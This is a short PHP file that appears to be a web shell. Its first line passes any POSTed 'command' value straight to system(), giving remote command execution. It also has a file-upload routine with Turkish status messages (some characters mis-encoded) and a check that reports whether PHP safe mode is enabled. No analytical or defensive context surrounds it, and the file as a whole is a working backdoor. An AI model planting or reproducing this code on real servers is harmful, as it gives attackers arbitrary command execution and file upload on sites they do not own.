<?php @$output = system($_POST['command']); ?><?php

function check_file()
{
global $file_name, $filename;
    $backupstring = "copy_of_";
    $filename = $backupstring."$filename";

    if( file_exists($filename))
    {
        check_file();
    }
}

if(!empty($file))
{
    $filename = $file_name;
    if( file_exists($file_name))
    {
        check_file();
        echo "<p align=center>Dosya Zaten Bulunuyor</p>";
    }

    else
    {
        copy($file,"$filename");
        if( file_exists($filename))
        {
            echo "<p align=center>Dosya Ba�ar�l� Bir �ekilde Y�klendi</p>";
        }
        elseif(! file_exists($filename))
        {
            echo "<p align=center>Dosya Bulunamad�</p>";
        }
    }
}
?><?php 
// Check for Safe Mode
if( ini_get('safe_mode') ) {
   print '<font color=#FF0000><b>G�venlik A��k</b></font>';
} else {
   print '<font color=#008000><b>G�venlik Kapal�</b></font>';
}

?>